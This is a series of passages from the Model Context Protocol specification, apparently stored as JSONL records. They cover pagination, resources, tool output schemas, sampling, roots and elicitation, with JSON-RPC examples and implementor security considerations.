Pagination allows servers to yield results in smaller chunks rather\nthan all at once.\n\nPagination is especially important when connecting to external services over the\ninternet, but also useful for local integrations to avoid performance issues with large\ndata sets.\n\n## Pagination Model\n\nPagination in MCP uses an opaque cursor-based approach, instead of numbered pages.\n\n- The **cursor** is an opaque string token, representing a position in the result set\n- **Page size** is determined by the server, and clients **MUST NOT** assume a fixed page\n  size\n\n## Response Format\n\nPagination starts when the server sends a **response** that includes:\n\n- The current page of results\n- An optional `nextCursor` field if more results exist\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": \"123\",\n  \"result\": {\n    \"resources\": [...],\n    \"nextCursor\": \"eyJwYWdlIjogM30=\"\n  }\n}\n```\n\n## Request Format\n\nAfter receiving a cursor, the client can _continue_ paginating by issuing a request\nincluding that cursor:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": \"124\",\n  \"method\": \"resources/list\",\n  \"params\": {\n    \"cursor\": \"eyJwYWdlIjogMn0=\"\n  }\n}\n```\n\n## Pagination Flow\n\n```mermaid\nsequenceDiagram\n    participant Client\n    participant Server\n\n    Client->>Server: List Request (no cursor)\n    loop Pagination Loop\n      Server-->>Client: Page of results + nextCursor\n      Client->>Server: List Request (with cursor)\n    end\n```\n\n## Operations Supporting Pagination\n\nThe following MCP operations support pagination:\n\n- `resources/list` - List available resources\n- `resources/templates/list` - List resource templates\n- `prompts/list` - List available prompts\n- `tools/list` - List available tools\n\n## Implementation Guidelines\n\n1. Servers **SHOULD**:\n   - Provide stable cursors\n   - Handle invalid cursors gracefully\n\n2. Clients **SHOULD**:\n   - Treat a missing `nextCursor` as the end of results\n   - Support both paginated and non-paginated flows\n\n3. Clients **MUST** treat cursors as opaque tokens:\n   - Don't make assumptions about cursor format\n   - Don't attempt to parse or modify cursors\n   - Don't persist cursors across sessions\n\n## Error Handling\n\nInvalid cursors **SHOULD** result in an error with code -32602 (Invalid params).\n"}

Resources allow servers to share data that provides context to\nlanguage models, such as files, database schemas, or application-specific information.\nEach resource is uniquely identified by a\n[URI](https://datatracker.ietf.org/doc/html/rfc3986).\n\n## User Interaction Model\n\nResources in MCP are designed to be **application-driven**, with host applications\ndetermining how to incorporate context based on their needs.\n\nFor example, applications could:\n\n- Expose resources through UI elements for explicit selection, in a tree or list view\n- Allow the user to search through and filter available resources\n- Implement automatic context inclusion, based on heuristics or the AI model's selection\n\n![Example of resource context picker](/specification/2025-11-25/server/resource-picker.png)\n\nHowever, implementations are free to expose resources through any interface pattern that\nsuits their needs&mdash;the protocol itself does not mandate any specific user\ninteraction model.\n\n## Capabilities\n\nServers that support resources **MUST** declare the `resources` capability:\n\n```json\n{\n  \"capabilities\": {\n    \"resources\": {\n      \"subscribe\": true,\n      \"listChanged\": true\n    }\n  }\n}\n```\n\nThe capability supports two optional features:\n\n- `subscribe`: whether the client can subscribe to be notified of changes to individual\n  resources.\n- `listChanged`: whether the server will emit notifications when the list of available\n  resources changes.\n\nBoth `subscribe` and `listChanged` are optional&mdash;servers can support neither,\neither, or both:\n\n```json\n{\n  \"capabilities\": {\n    \"resources\": {} // Neither feature supported\n  }\n}\n```\n\n```json\n{\n  \"capabilities\": {\n    \"resources\": {\n      \"subscribe\": true // Only subscriptions supported\n    }\n  }\n}\n```\n\n```json\n{\n  \"capabilities\": {\n    \"resources\": {\n      \"listChanged\": true // Only list change notifications supported\n    }\n  }\n}\n```\n\n## Protocol Messages\n\n### Listing Resources\n\nTo discover available resources, clients send a `resources/list` request. This operation\nsupports [pagination](/specification/2025-11-25/server/utilities/pagination).\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"method\": \"resources/list\",\n  \"params\": {\n    \"cursor\": \"optional-cursor-value\"\n  }\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"result\": {\n    \"resources\": [\n      {\n        \"uri\": \"file:///project/src/main.rs\",\n        \"name\": \"main.rs\",\n        \"title\": \"Rust Software Application Main File\",\n        \"description\": \"Primary application entry point\",\n        \"mimeType\": \"text/x-rust\",\n        \"icons\": [\n          {\n            \"src\": \"https://example.com/rust-file-icon.png\",\n            \"mimeType\": \"image/png\",\n            \"sizes\": [\"48x48\"]\n          }\n        ]\n      }\n    ],\n    \"nextCursor\": \"next-page-cursor\"\n  }\n}\n```\n\n### Reading Resources\n\nTo retrieve resource contents, clients send a `resources/read` request:\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 2,\n  \"method\": \"resources/read\",\n  \"params\": {\n    \"uri\": \"file:///project/src/main.rs\"\n  }\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 2,\n  \"result\": {\n    \"contents\": [\n      {\n        \"uri\": \"file:///project/src/main.rs\",\n        \"mimeType\": \"text/x-rust\",\n        \"text\": \"fn main() {\\n    println!(\\\"Hello world!\\\");\\n}\"\n      }\n    ]\n  }\n}\n```\n\n### Resource Templates\n\nResource templates allow servers to expose parameterized resources using\n[URI templates](https://datatracker.ietf.org/doc/html/rfc6570). Arguments may be\nauto-completed through [the completion API](/specification/2025-11-25/server/utilities/completion).\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 3,\n  \"method\": \"resources/templates/list\"\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 3,\n  \"result\": {\n    \"resourceTemplates\": [\n      {\n        \"uriTemplate\": \"file:///{path}\",\n        \"name\": \"Project Files\",\n        \"title\": \"📁 Project Files\",\n        \"description\": \"Access files in the project directory\",\n        \"mimeType\": \"application/octet-stream\",\n        \"icons\": [\n          {\n            \"src\": \"https://example.com/folder-icon.png\",\n            \"mimeType\": \"image/png\",\n            \"sizes\": [\"48x48\"]\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n### List Changed Notification\n\nWhen the list of available resources changes, servers that declared the `listChanged`\ncapability **SHOULD** send a notification:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"method\": \"notifications/resources/list_changed\"\n}\n```\n\n### Subscriptions\n\nThe protocol supports optional subscriptions to resource changes. Clients can subscribe\nto specific resources and receive notifications when they change:\n\n**Subscribe Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 4,\n  \"method\": \"resources/subscribe\",\n  \"params\": {\n    \"uri\": \"file:///project/src/main.rs\"\n  }\n}\n```\n\n**Update Notification:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"method\": \"notifications/resources/updated\",\n  \"params\": {\n    \"uri\": \"file:///project/src/main.rs\"\n  }\n}\n```\n\n## Message Flow\n\n```mermaid\nsequenceDiagram\n    participant Client\n    participant Server\n\n    Note over Client,Server: Resource Discovery\n    Client->>Server: resources/list\n    Server-->>Client: List of resources\n\n    Note over Client,Server: Resource Template Discovery\n    Client->>Server: resources/templates/list\n    Server-->>Client: List of resource templates\n\n    Note over Client,Server: Resource Access\n    Client->>Server: resources/read\n    Server-->>Client: Resource contents\n\n    Note over Client,Server: Subscriptions\n    Client->>Server: resources/subscribe\n    Server-->>Client: Subscription confirmed\n\n    Note over Client,Server: Updates\n    Server--)Client: notifications/resources/updated\n    Client->>Server: resources/read\n    Server-->>Client: Updated contents\n```\n\n## Data Types\n\n### Resource\n\nA resource definition includes:\n\n- `uri`: Unique identifier for the resource\n- `name`: The name of the resource.\n- `title`: Optional human-readable name of the resource for display purposes.\n- `description`: Optional description\n- `mimeType`: Optional MIME type\n- `size`: Optional size in bytes\n\n### Resource Contents\n\nResources can contain either text or binary data:\n\n#### Text Content\n\n```json\n{\n  \"uri\": \"file:///example.txt\",\n  \"mimeType\": \"text/plain\",\n  \"text\": \"Resource content\"\n}\n```\n\n#### Binary Content\n\n```json\n{\n  \"uri\": \"file:///example.png\",\n  \"mimeType\": \"image/png\",\n  \"blob\": \"base64-encoded-data\"\n}\n```\n\n### Annotations\n\nResources, resource templates and content blocks support optional annotations that provide hints to clients about how to use or display the resource:\n\n- **`audience`**: An array indicating the intended audience(s) for this resource. Valid values are `\"user\"` and `\"assistant\"`. For example, `[\"user\", \"assistant\"]` indicates content useful for both.\n- **`priority`**: A number from 0.0 to 1.0 indicating the importance of this resource. A value of 1 means \"most important\" (effectively required), while 0 means \"least important\" (entirely optional).\n- **`lastModified`**: An ISO 8601 formatted timestamp indicating when the resource was last modified (e.g., `\"2025-01-12T15:00:58Z\"`).\n\nExample resource with annotations:\n\n```json\n{\n  \"uri\": \"file:///project/README.md\",\n  \"name\": \"README.md\",\n  \"title\": \"Project Documentation\",\n  \"mimeType\": \"text/markdown\",\n  \"annotations\": {\n    \"audience\": [\"user\"],\n    \"priority\": 0.8,\n    \"lastModified\": \"2025-01-12T15:00:58Z\"\n  }\n}\n```\n\nClients can use these annotations to:\n\n- Filter resources based on their intended audience\n- Prioritize which resources to include in context\n- Display modification times or sort by recency\n\n## Common URI Schemes\n\nThe protocol defines several standard URI schemes. This list not\nexhaustive&mdash;implementations are always free to use additional, custom URI schemes.\n\n### https://\n\nUsed to represent a resource available on the web.\n\nServers **SHOULD** use this scheme only when the client is able to fetch and load the\nresource directly from the web on its own—that is, it doesn’t need to read the resource\nvia the MCP server.\n\nFor other use cases, servers **SHOULD** prefer to use another URI scheme, or define a\ncustom one, even if the server will itself be downloading resource contents over the\ninternet.\n\n### file://\n\nUsed to identify resources that behave like a filesystem. However, the resources do not\nneed to map to an actual physical filesystem.\n\nMCP servers **MAY** identify file:// resources with an\n[XDG MIME type](https://specifications.freedesktop.org/shared-mime-info-spec/0.14/ar01s02.html#id-1.3.14),\nlike `inode/directory`, to represent non-regular files (such as directories) that don’t\notherwise have a standard MIME type.\n\n### git://\n\nGit version control integration.\n\n### Custom URI Schemes\n\nCustom URI schemes **MUST** be in accordance with [RFC3986](https://datatracker.ietf.org/doc/html/rfc3986),\ntaking the above guidance in to account.\n\n## Error Handling\n\nServers **SHOULD** return standard JSON-RPC errors for common failure cases:\n\n- Resource not found: `-32002`\n- Internal errors: `-32603`\n\nExample error:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 5,\n  \"error\": {\n    \"code\": -32002,\n    \"message\": \"Resource not found\",\n    \"data\": {\n      \"uri\": \"file:///nonexistent.txt\"\n    }\n  }\n}\n```\n\n## Security Considerations\n\n1. Servers **MUST** validate all resource URIs\n2. Access controls **SHOULD** be implemented for sensitive resources\n3. Binary data **MUST** be properly encoded\n4. Resource permissions **SHOULD** be checked before operations\n"}

Servers that use embedded resources **SHOULD** implement the `resources` capability:\n\n```json\n{\n  \"type\": \"resource\",\n  \"resource\": {\n    \"uri\": \"file:///project/src/main.rs\",\n    \"mimeType\": \"text/x-rust\",\n    \"text\": \"fn main() {\\n    println!(\\\"Hello world!\\\");\\n}\",\n    \"annotations\": {\n      \"audience\": [\"user\", \"assistant\"],\n      \"priority\": 0.7,\n      \"lastModified\": \"2025-05-03T14:30:00Z\"\n    }\n  }\n}\n```\n\nEmbedded resources support the same [Resource annotations](/specification/2025-11-25/server/resources#annotations) as regular resources to help clients understand how to use them.\n\n#### Structured Content\n\n**Structured** content is returned as a JSON object in the `structuredContent` field of a result.\n\nFor backwards compatibility, a tool that returns structured content SHOULD also return the serialized JSON in a TextContent block.\n\n#### Output Schema\n\nTools may also provide an output schema for validation of structured results.\nIf an output schema is provided:\n\n- Servers **MUST** provide structured results that conform to this schema.\n- Clients **SHOULD** validate structured results against this schema.\n\nExample tool with output schema:\n\n```json\n{\n  \"name\": \"get_weather_data\",\n  \"title\": \"Weather Data Retriever\",\n  \"description\": \"Get current weather data for a location\",\n  \"inputSchema\": {\n    \"type\": \"object\",\n    \"properties\": {\n      \"location\": {\n        \"type\": \"string\",\n        \"description\": \"City name or zip code\"\n      }\n    },\n    \"required\": [\"location\"]\n  },\n  \"outputSchema\": {\n    \"type\": \"object\",\n    \"properties\": {\n      \"temperature\": {\n        \"type\": \"number\",\n        \"description\": \"Temperature in celsius\"\n      },\n      \"conditions\": {\n        \"type\": \"string\",\n        \"description\": \"Weather conditions description\"\n      },\n      \"humidity\": {\n        \"type\": \"number\",\n        \"description\": \"Humidity percentage\"\n      }\n    },\n    \"required\": [\"temperature\", \"conditions\", \"humidity\"]\n  }\n}\n```\n\nExample valid response for this tool:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 5,\n  \"result\": {\n    \"content\": [\n      {\n        \"type\": \"text\",\n        \"text\": \"{\\\"temperature\\\": 22.5, \\\"conditions\\\": \\\"Partly cloudy\\\", \\\"humidity\\\": 65}\"\n      }\n    ],\n    \"structuredContent\": {\n      \"temperature\": 22.5,\n      \"conditions\": \"Partly cloudy\",\n      \"humidity\": 65\n    }\n  }\n}\n```\n\nProviding an output schema helps clients and LLMs understand and properly handle structured tool outputs by:\n\n- Enabling strict schema validation of responses\n- Providing type information for better integration with programming languages\n- Guiding clients and LLMs to properly parse and utilize the returned data\n- Supporting better documentation and developer experience\n\n### Schema Examples\n\n#### Tool with default 2020-12 schema:\n\n```json\n{\n  \"name\": \"calculate_sum\",\n  \"description\": \"Add two numbers\",\n  \"inputSchema\": {\n    \"type\": \"object\",\n    \"properties\": {\n      \"a\": { \"type\": \"number\" },\n      \"b\": { \"type\": \"number\" }\n    },\n    \"required\": [\"a\", \"b\"]\n  }\n}\n```\n\n#### Tool with explicit draft-07 schema:\n\n```json\n{\n  \"name\": \"calculate_sum\",\n  \"description\": \"Add two numbers\",\n  \"inputSchema\": {\n    \"$schema\": \"http://json-schema.org/draft-07/schema#\",\n    \"type\": \"object\",\n    \"properties\": {\n      \"a\": { \"type\": \"number\" },\n      \"b\": { \"type\": \"number\" }\n    },\n    \"required\": [\"a\", \"b\"]\n  }\n}\n```\n\n#### Tool with no parameters:\n\n```json\n{\n  \"name\": \"get_current_time\",\n  \"description\": \"Returns the current server time\",\n  \"inputSchema\": {\n    \"type\": \"object\",\n    \"additionalProperties\": false\n  }\n}\n```\n\n## Error Handling\n\nTools use two error reporting mechanisms:\n\n1. **Protocol Errors**: Standard JSON-RPC errors for issues like:\n   - Unknown tools\n   - Malformed requests (requests that fail to satisfy [CallToolRequest schema](specification/2025-11-25/schema#calltoolrequest))\n   - Server errors\n\n2. **Tool Execution Errors**: Reported in tool results with `isError: true`:\n   - API failures\n   - Input validation errors (e.g., date in wrong format, value out of range)\n   - Business logic errors\n\n**Tool Execution Errors** contain actionable feedback that language models can use to self-correct and retry with adjusted parameters.\n**Protocol Errors** indicate issues with the request structure itself that models are less likely to be able to fix.\nClients **SHOULD** provide tool execution errors to language models to enable self-correction.\nClients **MAY** provide protocol errors to language models, though these are less likely to result in successful recovery.\n\nExample protocol error:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 3,\n  \"error\": {\n    \"code\": -32602,\n    \"message\": \"Unknown tool: invalid_tool_name\"\n  }\n}\n```\n\nExample tool execution error (input validation):\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 4,\n  \"result\": {\n    \"content\": [\n      {\n        \"type\": \"text\",\n        \"text\": \"Invalid departure date: must be in the future. Current date is 08/08/2025.\"\n      }\n    ],\n    \"isError\": true\n  }\n}\n```\n\n## Security Considerations\n\n1. Servers **MUST**:\n   - Validate all tool inputs\n   - Implement proper access controls\n   - Rate limit tool invocations\n   - Sanitize tool outputs\n\n2. Clients **SHOULD**:\n   - Prompt for user confirmation on sensitive operations\n   - Show tool inputs to the user before calling the server, to avoid malicious or\n     accidental data exfiltration\n   - Validate tool results before passing to LLM\n   - Implement timeouts for tool calls\n   - Log tool usage for audit purposes\n"}
{"source":"github","repo":"mcp-spec","path":"docs/specification/2025-11-25/index.mdx","content":"---\ntitle: Specification\n---\n\n<div id=\"enable-section-numbers\" />\n\n[Model Context Protocol](https://modelcontextprotocol.io) (MCP) is an open protocol that\nenables seamless integration between LLM applications and external data sources and\ntools. Whether you're building an AI-powered IDE, enhancing a chat interface, or creating\ncustom AI workflows, MCP provides a standardized way to connect LLMs with the context\nthey need.\n\nThis specification defines the authoritative protocol requirements, based on the\nTypeScript schema in\n[schema.ts](https://github.com/modelcontextprotocol/specification/blob/main/schema/2025-11-25/schema.ts).\n\nFor implementation guides and examples, visit\n[modelcontextprotocol.io](https://modelcontextprotocol.io).\n\nThe key words \"MUST\", \"MUST NOT\", \"REQUIRED\", \"SHALL\", \"SHALL NOT\", \"SHOULD\", \"SHOULD\nNOT\", \"RECOMMENDED\", \"NOT RECOMMENDED\", \"MAY\", and \"OPTIONAL\" in this document are to be\ninterpreted as described in [BCP 14](https://datatracker.ietf.org/doc/html/bcp14)\n[[RFC2119](https://datatracker.ietf.org/doc/html/rfc2119)]\n[[RFC8174](https://datatracker.ietf.org/doc/html/rfc8174)] when, and only when, they\nappear in all capitals, as shown here.\n\n## Overview\n\nMCP provides a standardized way for applications to:\n\n- Share contextual information with language models\n- Expose tools and capabilities to AI systems\n- Build composable integrations and workflows\n\nThe protocol uses [JSON-RPC](https://www.jsonrpc.org/) 2.0 messages to establish\ncommunication between:\n\n- **Hosts**: LLM applications that initiate connections\n- **Clients**: Connectors within the host application\n- **Servers**: Services that provide context and capabilities\n\nMCP takes some inspiration from the\n[Language Server Protocol](https://microsoft.github.io/language-server-protocol/), which\nstandardizes how to add support for programming languages across a whole ecosystem of\ndevelopment tools. In a similar way, MCP standardizes how to integrate additional context\nand tools into the ecosystem of AI applications.\n\n## Key Details\n\n### Base Protocol\n\n- [JSON-RPC](https://www.jsonrpc.org/) message format\n- Stateful connections\n- Server and client capability negotiation\n\n### Features\n\nServers offer any of the following features to clients:\n\n- **Resources**: Context and data, for the user or the AI model to use\n- **Prompts**: Templated messages and workflows for users\n- **Tools**: Functions for the AI model to execute\n\nClients may offer the following features to servers:\n\n- **Sampling**: Server-initiated agentic behaviors and recursive LLM interactions\n- **Roots**: Server-initiated inquiries into URI or filesystem boundaries to operate in\n- **Elicitation**: Server-initiated requests for additional information from users\n\n### Additional Utilities\n\n- Configuration\n- Progress tracking\n- Cancellation\n- Error reporting\n- Logging\n\n## Security and Trust & Safety\n\nThe Model Context Protocol enables powerful capabilities through arbitrary data access\nand code execution paths. With this power comes important security and trust\nconsiderations that all implementors must carefully address.\n\n### Key Principles\n\n1. **User Consent and Control**\n   - Users must explicitly consent to and understand all data access and operations\n   - Users must retain control over what data is shared and what actions are taken\n   - Implementors should provide clear UIs for reviewing and authorizing activities\n\n2. **Data Privacy**\n   - Hosts must obtain explicit user consent before exposing user data to servers\n   - Hosts must not transmit resource data elsewhere without user consent\n   - User data should be protected with appropriate access controls\n\n3. **Tool Safety**\n   - Tools represent arbitrary code execution and must be treated with appropriate\n     caution.\n     - In particular, descriptions of tool behavior such as annotations should be\n       considered untrusted, unless obtained from a trusted server.\n   - Hosts must obtain explicit user consent before invoking any tool\n   - Users should understand what each tool does before authorizing its use\n\n4. **LLM Sampling Controls**\n   - Users must explicitly approve any LLM sampling requests\n   - Users should control:\n     - Whether sampling occurs at all\n     - The actual prompt that will be sent\n     - What results the server can see\n   - The protocol intentionally limits server visibility into prompts\n\n### Implementation Guidelines\n\nWhile MCP itself cannot enforce these security principles at the protocol level,\nimplementors **SHOULD**:\n\n1. Build robust consent and authorization flows into their applications\n2. Provide clear documentation of security implications\n3. Implement appropriate access controls and data protections\n4. Follow security best practices in their integrations\n5. Consider privacy implications in their feature designs\n\n## Learn More\n\nExplore the detailed specification for each protocol component:\n\n<CardGroup cols={5}>\n  <Card\n    title=\"Architecture\"\n    icon=\"sitemap\"\n    href=\"/specification/2025-11-25/architecture\"\n  />\n  <Card\n    title=\"Base Protocol\"\n    icon=\"code\"\n    href=\"/specification/2025-11-25/basic\"\n  />\n  <Card\n    title=\"Server Features\"\n    icon=\"server\"\n    href=\"/specification/2025-11-25/server\"\n  />\n  <Card\n    title=\"Client Features\"\n    icon=\"user\"\n    href=\"/specification/2025-11-25/client\"\n  />\n  <Card title=\"Contributing\" icon=\"pencil\" href=\"/development/contributing\" />\n</CardGroup>\n"}

{"source":"github","repo":"mcp-spec","path":"docs/specification/2025-06-18/client/sampling.mdx","content":"---\ntitle: Sampling\n---\n\n<div id=\"enable-section-numbers\" />\n\n<Info>**Protocol Revision**: 2025-06-18</Info>\n\nThe Model Context Protocol (MCP) provides a standardized way for servers to request LLM\nsampling (\"completions\" or \"generations\") from language models via clients. This flow\nallows clients to maintain control over model access, selection, and permissions while\nenabling servers to leverage AI capabilities&mdash;with no server API keys necessary.\nServers can request text, audio, or image-based interactions and optionally include\ncontext from MCP servers in their prompts.\n\n## User Interaction Model\n\nSampling in MCP allows servers to implement agentic behaviors, by enabling LLM calls to\noccur _nested_ inside other MCP server features.\n\nImplementations are free to expose sampling through any interface pattern that suits\ntheir needs&mdash;the protocol itself does not mandate any specific user interaction\nmodel.\n\n<Warning>\n\nFor trust & safety and security, there **SHOULD** always\nbe a human in the loop with the ability to deny sampling requests.\n\nApplications **SHOULD**:\n\n- Provide UI that makes it easy and intuitive to review sampling requests\n- Allow users to view and edit prompts before sending\n- Present generated responses for review before delivery\n\n</Warning>\n\n## Capabilities\n\nClients that support sampling **MUST** declare the `sampling` capability during\n[initialization](/specification/2025-06-18/basic/lifecycle#initialization):\n\n```json\n{\n  \"capabilities\": {\n    \"sampling\": {}\n  }\n}\n```\n\n## Protocol Messages\n\n### Creating Messages\n\nTo request a language model generation, servers send a `sampling/createMessage` request:\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"method\": \"sampling/createMessage\",\n  \"params\": {\n    \"messages\": [\n      {\n        \"role\": \"user\",\n        \"content\": {\n          \"type\": \"text\",\n          \"text\": \"What is the capital of France?\"\n        }\n      }\n    ],\n    \"modelPreferences\": {\n      \"hints\": [\n        {\n          \"name\": \"claude-3-sonnet\"\n        }\n      ],\n      \"intelligencePriority\": 0.8,\n      \"speedPriority\": 0.5\n    },\n    \"systemPrompt\": \"You are a helpful assistant.\",\n    \"maxTokens\": 100\n  }\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"result\": {\n    \"role\": \"assistant\",\n    \"content\": {\n      \"type\": \"text\",\n      \"text\": \"The capital of France is Paris.\"\n    },\n    \"model\": \"claude-3-sonnet-20240307\",\n    \"stopReason\": \"endTurn\"\n  }\n}\n```\n\n## Message Flow\n\n```mermaid\nsequenceDiagram\n    participant Server\n    participant Client\n    participant User\n    participant LLM\n\n    Note over Server,Client: Server initiates sampling\n    Server->>Client: sampling/createMessage\n\n    Note over Client,User: Human-in-the-loop review\n    Client->>User: Present request for approval\n    User-->>Client: Review and approve/modify\n\n    Note over Client,LLM: Model interaction\n    Client->>LLM: Forward approved request\n    LLM-->>Client: Return generation\n\n    Note over Client,User: Response review\n    Client->>User: Present response for approval\n    User-->>Client: Review and approve/modify\n\n    Note over Server,Client: Complete request\n    Client-->>Server: Return approved response\n```\n\n## Data Types\n\n### Messages\n\nSampling messages can contain:\n\n#### Text Content\n\n```json\n{\n  \"type\": \"text\",\n  \"text\": \"The message content\"\n}\n```\n\n#### Image Content\n\n```json\n{\n  \"type\": \"image\",\n  \"data\": \"base64-encoded-image-data\",\n  \"mimeType\": \"image/jpeg\"\n}\n```\n\n#### Audio Content\n\n```json\n{\n  \"type\": \"audio\",\n  \"data\": \"base64-encoded-audio-data\",\n  \"mimeType\": \"audio/wav\"\n}\n```\n\n### Model Preferences\n\nModel selection in MCP requires careful abstraction since servers and clients may use\ndifferent AI providers with distinct model offerings. A server cannot simply request a\nspecific model by name since the client may not have access to that exact model or may\nprefer to use a different provider's equivalent model.\n\nTo solve this, MCP implements a preference system that combines abstract capability\npriorities with optional model hints:\n\n#### Capability Priorities\n\nServers express their needs through three normalized priority values (0-1):\n\n- `costPriority`: How important is minimizing costs? Higher values prefer cheaper models.\n- `speedPriority`: How important is low latency? Higher values prefer faster models.\n- `intelligencePriority`: How important are advanced capabilities? Higher values prefer\n  more capable models.\n\n#### Model Hints\n\nWhile priorities help select models based on characteristics, `hints` allow servers to\nsuggest specific models or model families:\n\n- Hints are treated as substrings that can match model names flexibly\n- Multiple hints are evaluated in order of preference\n- Clients **MAY** map hints to equivalent models from different providers\n- Hints are advisory&mdash;clients make final model selection\n\nFor example:\n\n```json\n{\n  \"hints\": [\n    { \"name\": \"claude-3-sonnet\" }, // Prefer Sonnet-class models\n    { \"name\": \"claude\" } // Fall back to any Claude model\n  ],\n  \"costPriority\": 0.3, // Cost is less important\n  \"speedPriority\": 0.8, // Speed is very important\n  \"intelligencePriority\": 0.5 // Moderate capability needs\n}\n```\n\nThe client processes these preferences to select an appropriate model from its available\noptions. For instance, if the client doesn't have access to Claude models but has Gemini,\nit might map the sonnet hint to `gemini-1.5-pro` based on similar capabilities.\n\n## Error Handling\n\nClients **SHOULD** return errors for common failure cases:\n\nExample error:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"error\": {\n    \"code\": -1,\n    \"message\": \"User rejected sampling request\"\n  }\n}\n```\n\n## Security Considerations\n\n1.

Roots define the boundaries of where servers can operate\nwithin the filesystem, allowing them to understand which directories and files they have\naccess to. Servers can request the list of roots from supporting clients and receive\nnotifications when that list changes.\n\n## User Interaction Model\n\nRoots in MCP are typically exposed through workspace or project configuration interfaces.\n\nFor example, implementations could offer a workspace/project picker that allows users to\nselect directories and files the server should have access to. This can be combined with\nautomatic workspace detection from version control systems or project files.\n\nHowever, implementations are free to expose roots through any interface pattern that\nsuits their needs&mdash;the protocol itself does not mandate any specific user\ninteraction model.\n\n## Capabilities\n\nClients that support roots **MUST** declare the `roots` capability during\n[initialization](/specification/2025-06-18/basic/lifecycle#initialization):\n\n```json\n{\n  \"capabilities\": {\n    \"roots\": {\n      \"listChanged\": true\n    }\n  }\n}\n```\n\n`listChanged` indicates whether the client will emit notifications when the list of roots\nchanges.\n\n## Protocol Messages\n\n### Listing Roots\n\nTo retrieve roots, servers send a `roots/list` request:\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"method\": \"roots/list\"\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"result\": {\n    \"roots\": [\n      {\n        \"uri\": \"file:///home/user/projects/myproject\",\n        \"name\": \"My Project\"\n      }\n    ]\n  }\n}\n```\n\n### Root List Changes\n\nWhen roots change, clients that support `listChanged` **MUST** send a notification:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"method\": \"notifications/roots/list_changed\"\n}\n```\n\n## Message Flow\n\n```mermaid\nsequenceDiagram\n    participant Server\n    participant Client\n\n    Note over Server,Client: Discovery\n    Server->>Client: roots/list\n    Client-->>Server: Available roots\n\n    Note over Server,Client: Changes\n    Client--)Server: notifications/roots/list_changed\n    Server->>Client: roots/list\n    Client-->>Server: Updated roots\n```\n\n## Data Types\n\n### Root\n\nA root definition includes:\n\n- `uri`: Unique identifier for the root. This **MUST** be a `file://` URI in the current\n  specification.\n- `name`: Optional human-readable name for display purposes.\n\nExample roots for different use cases:\n\n#### Project Directory\n\n```json\n{\n  \"uri\": \"file:///home/user/projects/myproject\",\n  \"name\": \"My Project\"\n}\n```\n\n#### Multiple Repositories\n\n```json\n[\n  {\n    \"uri\": \"file:///home/user/repos/frontend\",\n    \"name\": \"Frontend Repository\"\n  },\n  {\n    \"uri\": \"file:///home/user/repos/backend\",\n    \"name\": \"Backend Repository\"\n  }\n]\n```\n\n## Error Handling\n\nClients **SHOULD** return standard JSON-RPC errors for common failure cases:\n\n- Client does not support roots: `-32601` (Method not found)\n- Internal errors: `-32603`\n\nExample error:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"error\": {\n    \"code\": -32601,\n    \"message\": \"Roots not supported\",\n    \"data\": {\n      \"reason\": \"Client does not have roots capability\"\n    }\n  }\n}\n```\n\n## Security Considerations\n\n1. Clients **MUST**:\n   - Only expose roots with appropriate permissions\n   - Validate all root URIs to prevent path traversal\n   - Implement proper access controls\n   - Monitor root accessibility\n\n2. Servers **SHOULD**:\n   - Handle cases where roots become unavailable\n   - Respect root boundaries during operations\n   - Validate all paths against provided roots\n\n## Implementation Guidelines\n\n1. Clients **SHOULD**:\n   - Prompt users for consent before exposing roots to servers\n   - Provide clear user interfaces for root management\n   - Validate root accessibility before exposing\n   - Monitor for root changes\n\n2. Servers **SHOULD**:\n   - Check for roots capability before usage\n   - Handle root list changes gracefully\n   - Respect root boundaries in operations\n   - Cache root information appropriately\n"}

To simplify implementation for clients, elicitation schemas are limited to flat objects with primitive properties only:\n\n```json\n\"requestedSchema\": {\n  \"type\": \"object\",\n  \"properties\": {\n    \"propertyName\": {\n      \"type\": \"string\",\n      \"title\": \"Display Name\",\n      \"description\": \"Description of the property\"\n    },\n    \"anotherProperty\": {\n      \"type\": \"number\",\n      \"minimum\": 0,\n      \"maximum\": 100\n    }\n  },\n  \"required\": [\"propertyName\"]\n}\n```\n\n### Supported Schema Types\n\nThe schema is restricted to these primitive types:\n\n1. **String Schema**\n\n   ```json\n   {\n     \"type\": \"string\",\n     \"title\": \"Display Name\",\n     \"description\": \"Description text\",\n     \"minLength\": 3,\n     \"maxLength\": 50,\n     \"format\": \"email\" // Supported: \"email\", \"uri\", \"date\", \"date-time\"\n   }\n   ```\n\n   Supported formats: `email`, `uri`, `date`, `date-time`\n\n2. **Number Schema**\n\n   ```json\n   {\n     \"type\": \"number\", // or \"integer\"\n     \"title\": \"Display Name\",\n     \"description\": \"Description text\",\n     \"minimum\": 